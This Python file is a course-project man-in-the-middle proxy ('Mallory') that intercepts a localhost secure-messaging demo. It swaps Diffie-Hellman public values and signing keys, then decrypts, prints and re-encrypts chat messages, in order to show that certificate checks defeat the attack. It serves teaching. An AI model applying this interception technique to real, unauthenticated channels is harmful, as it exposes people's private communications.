"""Mallory: man-in-the-middle proxy for the live MITM demo (Phase 5).

BACSE203 Computer Networks - Secure Messaging System

Sits between the clients and the real server:

    alice/bob --> 127.0.0.1:9000 [this proxy] --> 127.0.0.1:9001 [server.py]

Modes:
    watch - forward everything unchanged and print what an eavesdropper sees
    swap  - replace every DH public value with Mallory's own and re-sign it
            with Mallory's key, then decrypt, print and re-encrypt every chat
            message passing through

Expected results:
    clients started with --no-cert  -> swap succeeds, Mallory reads messages
    clients with certificates (default) -> the receiver rejects the swapped
    DH value because the signing key does not match the certificate

Usage (from the project root):
    python src/server.py --port 9001
    python attacks/mitm_proxy.py --mode swap
"""

import argparse
import os
import socket
import sys
import threading
from typing import Dict, Optional

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from src.crypto import DecryptionError, SessionCipher, chat_associated_data
from src.dh import compute_public_key, compute_shared_secret, derive_session_key, generate_private_key
from src.message_format import chat_signed_fields, dh_public_signed_fields
from src.protocol import MessageReader, ProtocolDecodeError, default_protocol
from src.signing import SigningIdentity

RECV_BUFFER_SIZE = 4096
PREVIEW_CHARS = 32


class Mallory:
    """Holds the attacker's keys and rewrites frames according to the mode."""

    def __init__(self, mode: str) -> None:
        self.mode = mode
        # Mallory's own Ed25519 signing key, used to re-sign everything she changes.
        self.identity = SigningIdentity.generate()
        # One DH private key used with every victim: the key she shares with
        # user X is then simply X's public value raised to this exponent.
        self.private_key = generate_private_key()
        self.public_key = compute_public_key(self.private_key)
        self.session_keys: Dict[str, bytes] = {}
        self.lock = threading.Lock()

    def intercept(self, payload: dict) -> dict:
        """Return the frame to forward to the server (possibly modified)."""
        kind = payload.get("type")
        sender, target = payload.get("sender"), payload.get("target")

        if kind == "dh_public":
            print(f"[mallory] DH value {sender} -> {target}: {str(payload.get('public_key', ''))[:PREVIEW_CHARS]}...")
            if self.mode == "swap":
                return self.swap_dh(payload)
        elif kind == "chat":
            print(f"[mallory] chat {sender} -> {target}: ciphertext={payload.get('ciphertext', '')[:PREVIEW_CHARS]}...")
            if self.mode == "swap":
                return self.reencrypt_chat(payload)
        return payload

    def swap_dh(self, payload: dict) -> dict:
        sender, target = payload["sender"], payload["target"]
        try:
            peer_public_key = int(payload["public_key"])
        except (KeyError, ValueError):
            return payload

        shared_secret = compute_shared_secret(self.private_key, peer_public_key)
        with self.lock:
            self.session_keys[sender] = derive_session_key(shared_secret)

        # Keep the victim's real certificate (a forged one would fail the CA
        # check outright) but substitute Mallory's DH value and signing key.
        certificate = payload.get("certificate", "")
        signing_key = self.identity.public_key_b64
        payload["public_key"] = str(self.public_key)
        payload["signing_key"] = signing_key
        payload["signature"] = self.identity.sign(
            dh_public_signed_fields(sender, target, self.public_key, signing_key, certificate)
        )
        print(f"[mallory] SWAPPED {sender}'s DH value and signing key with Mallory's own")
        return payload

    def reencrypt_chat(self, payload: dict) -> dict:
        sender, target = payload.get("sender"), payload.get("target")
        with self.lock:
            key_in = self.session_keys.get(sender)
            key_out = self.session_keys.get(target)
        if key_in is None or key_out is None:
            print("[mallory] No key with both sides yet; forwarding unchanged")
            return payload

        aad = chat_associated_data(sender, target)
        try:
            text = SessionCipher(key_in).decrypt(payload["nonce"], payload["ciphertext"], aad)
        except (DecryptionError, KeyError):
            print("[mallory] Could not decrypt; forwarding unchanged")
            return payload

        print(f"[mallory] *** READ {sender} -> {target}: {text!r} ***")
        nonce, ciphertext = SessionCipher(key_out).encrypt(text, aad)
        payload["nonce"] = nonce
        payload["ciphertext"] = ciphertext
        payload["signature"] = self.identity.sign(chat_signed_fields(sender, target, nonce, ciphertext))
        return payload


def pipe(source: socket.socket, dest: socket.socket, mallory: Optional[Mallory]) -> None:
    """Forward bytes from source to dest.

    Only the client->server direction passes through Mallory. Frames coming
    back from the server are relayed copies of frames she has already
    rewritten, so they are forwarded untouched.
    """
    reader = MessageReader(default_protocol)
    try:
        while True:
            data = source.recv(RECV_BUFFER_SIZE)
            if not data:
                break
            if mallory is None:
                dest.sendall(data)
                continue
            for frame in reader.feed(data):
                try:
                    payload = reader.decode(frame)
                except ProtocolDecodeError:
                    dest.sendall(frame + default_protocol.delimiter)
                    continue
                dest.sendall(default_protocol.encode(mallory.intercept(payload)))
    except OSError:
        pass
    finally:
        for sock in (source, dest):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass


def main() -> None:
    parser = argparse.ArgumentParser(description="Mallory man-in-the-middle proxy")
    parser.add_argument("--mode", choices=["watch", "swap"], default="watch", help="watch = eavesdrop only, swap = DH key substitution")
    parser.add_argument("--listen-port", type=int, default=9000, help="Port the clients connect to")
    parser.add_argument("--server-port", type=int, default=9001, help="Port the real server listens on")
    args = parser.parse_args()

    mallory = Mallory(args.mode)
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", args.listen_port))
    listener.listen(5)
    print(f"[mallory] mode={args.mode}, listening on 127.0.0.1:{args.listen_port}, forwarding to 127.0.0.1:{args.server_port}")

    try:
        while True:
            client, address = listener.accept()
            try:
                upstream = socket.create_connection(("127.0.0.1", args.server_port))
            except OSError as exc:
                print(f"[mallory] Cannot reach server on port {args.server_port}: {exc}")
                client.close()
                continue
            print(f"[mallory] Intercepting new connection from {address}")
            threading.Thread(target=pipe, args=(client, upstream, mallory), daemon=True).start()
            threading.Thread(target=pipe, args=(upstream, client, None), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[mallory] Stopped.")
    finally:
        listener.close()


if __name__ == "__main__":
    main()
